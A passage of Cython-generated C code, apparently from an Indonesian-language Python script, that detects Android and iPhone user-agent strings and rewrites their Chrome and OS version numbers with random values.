          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_anj, __pyx_n_s_replace); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_re); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_findall); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_anj); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_15 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_1)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_kp_s_Android, __pyx_t_12};
            __pyx_t_14 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_kp_s_Android, __pyx_t_12};
            __pyx_t_14 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          } else
          #endif
          {
            __pyx_t_16 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_16);
            if (__pyx_t_15) {
              __Pyx_GIVEREF(__pyx_t_15); PyTuple_SET_ITEM(__pyx_t_16, 0, __pyx_t_15); __pyx_t_15 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_Android);
            __Pyx_GIVEREF(__pyx_kp_s_Android);
            PyTuple_SET_ITEM(__pyx_t_16, 0+__pyx_t_13, __pyx_kp_s_Android);
            __Pyx_GIVEREF(__pyx_t_12);
            PyTuple_SET_ITEM(__pyx_t_16, 1+__pyx_t_13, __pyx_t_12);
            __pyx_t_12 = 0;
            __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_16, NULL); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_14, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_versi_android); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 154, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_16 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_t_1, __pyx_t_14};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_t_1, __pyx_t_14};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          {
            __pyx_t_12 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_12);
            if (__pyx_t_16) {
              __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_16); __pyx_t_16 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_12, 0+__pyx_t_13, __pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_12, 1+__pyx_t_13, __pyx_t_14);
            __pyx_t_1 = 0;
            __pyx_t_14 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_12, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 154, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          }
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF_SET(__pyx_v_ugent, __pyx_t_8);
          __pyx_t_8 = 0;

          
          goto __pyx_L21;
        }

        
        __pyx_t_2 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_Mozilla_5_0_Linux_U_Android, __pyx_v_ua, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 155, __pyx_L13_error)
        __pyx_t_3 = (__pyx_t_2 != 0);
        if (__pyx_t_3) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 156, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 156, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 156, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF_SET(__pyx_v_versi_android, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_re); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_sub); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 157, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_10 = 0;
          __pyx_t_11 = 127;
          __Pyx_INCREF(__pyx_kp_u_Chrome);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Chrome);
          PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_Chrome);
          __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_versi_chrome, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 157, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
          __Pyx_GIVEREF(__pyx_t_14);
          PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_14);
          __pyx_t_14 = 0;
          __Pyx_INCREF(__pyx_kp_u_Mobile);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Mobile);
          PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_Mobile);
          __pyx_t_14 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 157, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[4] = {__pyx_t_7, __pyx_kp_s_Chrome_Mobile, __pyx_t_14, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[4] = {__pyx_t_7, __pyx_kp_s_Chrome_Mobile, __pyx_t_14, __pyx_v_ua};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          {
            __pyx_t_1 = PyTuple_New(3+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 157, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_1);
            if (__pyx_t_7) {
              __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_7); __pyx_t_7 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_Chrome_Mobile);
            __Pyx_GIVEREF(__pyx_kp_s_Chrome_Mobile);
            PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_13, __pyx_kp_s_Chrome_Mobile);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_13, __pyx_t_14);
            __Pyx_INCREF(__pyx_v_ua);
            __Pyx_GIVEREF(__pyx_v_ua);
            PyTuple_SET_ITEM(__pyx_t_1, 2+__pyx_t_13, __pyx_v_ua);
            __pyx_t_14 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_1, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 157, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_anj, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_anj, __pyx_n_s_replace); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_re); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_findall); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_anj); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_16 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_kp_s_Android, __pyx_t_14};
            __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
            PyObject *__pyx_temp[3] = {__pyx_t_16, __pyx_kp_s_Android, __pyx_t_14};
            __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          } else
          #endif
          {
            __pyx_t_15 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_15);
            if (__pyx_t_16) {
              __Pyx_GIVEREF(__pyx_t_16); PyTuple_SET_ITEM(__pyx_t_15, 0, __pyx_t_16); __pyx_t_16 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_Android);
            __Pyx_GIVEREF(__pyx_kp_s_Android);
            PyTuple_SET_ITEM(__pyx_t_15, 0+__pyx_t_13, __pyx_kp_s_Android);
            __Pyx_GIVEREF(__pyx_t_14);
            PyTuple_SET_ITEM(__pyx_t_15, 1+__pyx_t_13, __pyx_t_14);
            __pyx_t_14 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_15, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          }
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_GetItemInt(__pyx_t_1, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_versi_android); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_15 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_t_7, __pyx_t_1};
            __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_12)) {
            PyObject *__pyx_temp[3] = {__pyx_t_15, __pyx_t_7, __pyx_t_1};
            __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_12, __pyx_temp+1-__pyx_t_13, 2+__pyx_t_13); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          {
            __pyx_t_14 = PyTuple_New(2+__pyx_t_13); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_14);
            if (__pyx_t_15) {
              __Pyx_GIVEREF(__pyx_t_15); PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_15); __pyx_t_15 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_14, 0+__pyx_t_13, __pyx_t_7);
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_14, 1+__pyx_t_13, __pyx_t_1);
            __pyx_t_7 = 0;
            __pyx_t_1 = 0;
            __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_14, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 158, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_ugent, __pyx_t_8);
          __pyx_t_8 = 0;

          
          goto __pyx_L21;
        }

        
        __pyx_t_3 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_Mozilla_5_0_iPhone, __pyx_v_ua, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 159, __pyx_L13_error)
        __pyx_t_2 = (__pyx_t_3 != 0);
        if (__pyx_t_2) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__35, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = PyNumber_Add(__pyx_t_12, __pyx_n_s__36); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__37, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_12); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = PyNumber_Add(__pyx_t_8, __pyx_t_14); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 160, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF_SET(__pyx_v_versi_iphone, __pyx_t_12);
          __pyx_t_12 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_re); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 161, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_sub); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 161, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = PyTuple_New(3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 161, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_10 = 0;
          __pyx_t_11 = 127;
          __Pyx_INCREF(__pyx_kp_u_CriOS);
          __pyx_t_10 += 6;
          __Pyx_GIVEREF(__pyx_kp_u_CriOS);
          PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_kp_u_CriOS);
          __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_v_versi_chrome, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 161, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
          __Pyx_GIVEREF(__pyx_t_1);
          PyTuple_SET_ITEM(__pyx_t_14, 1, __pyx_t_1);
          __pyx_t_1 = 0;
          __Pyx_INCREF(__pyx_kp_u_Mobile);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Mobile);
          PyTuple_SET_ITEM(__pyx_t_14, 2, __pyx_kp_u_Mobile);
          __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_14, 3, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 161, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = NULL;
          __pyx_t_13 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_14)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
              __Pyx_INCREF(__pyx_t_14);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_8, function);
              __pyx_t_13 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[4] = {__pyx_t_14, __pyx_kp_s_CriOS_Mobile, __pyx_t_1, __pyx_v_ua};
            __pyx_t_12 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 161, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
            PyObject *__pyx_temp[4] = {__pyx_t_14, __pyx_kp_s_CriOS_Mobile, __pyx_t_1, __pyx_v_ua};
            __pyx_t_12 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_13, 3+__pyx_t_13); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 161, __pyx_L13_error)
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          } else
          #endif
          {
            __pyx_t_7 = PyTuple_New(3+__pyx_t_13); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 161, __pyx_L13_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_14) {
              __Pyx_GIVEREF(__pyx_t_14); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_14); __pyx_t_14 = NULL;
            }
            __Pyx_INCREF(__pyx_kp_s_CriOS_Mobile);
            __Pyx_GIVEREF(__pyx_kp_s_CriOS_Mobile);
            PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_13, __pyx_kp_s_CriOS_Mobile);
            __Pyx_GIVEREF(__pyx_t_1);
            PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_13, __pyx_t_1);
